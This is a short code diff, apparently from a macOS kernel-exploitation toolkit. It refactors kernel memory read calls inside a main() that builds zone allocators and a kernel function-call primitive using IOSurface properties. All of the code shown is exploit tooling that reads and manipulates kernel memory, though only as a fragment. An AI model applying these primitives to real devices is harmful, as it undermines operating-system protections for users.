@@ -68,7 +68,7 @@ int main(int argc, const char* argv[]) {
     
     uintptr_t proc = xe_xnu_proc_current_proc();
     
-    xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE)), 1);
+    xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE), 0), 1);
     xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), 128), 1);
     
     xe_util_kfunc_basic_t kfunc = xe_util_kfunc_basic_create(proc, io_event_source_allocator, block_allocator, VAR_ZONE_ARRAY_LEN - 1);
@@ -89,7 +89,7 @@ int main(int argc, const char* argv[]) {
     error = xe_io_surface_scan_all_clients_for_prop("iosurface_alloc_1", &surface);
     xe_assert_err(error);
     
-    uintptr_t props = xe_kmem_read_uint64(KMEM_OFFSET(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET));
+    uintptr_t props = xe_kmem_read_uint64(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
     error = xe_os_dictionary_set_value_of_key(props, "iosurface_alloc_0", io_event_source);
     xe_assert_err(error);
     xe_iosurface_allocator_destroy(&allocator);
